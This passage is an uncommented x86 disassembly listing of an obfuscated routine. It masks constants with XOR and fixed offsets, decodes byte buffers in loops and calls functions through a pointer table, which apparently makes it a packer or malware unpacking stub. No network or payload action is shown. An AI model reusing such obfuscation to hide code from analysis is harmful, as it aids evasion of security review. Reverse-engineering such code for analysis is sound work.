  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
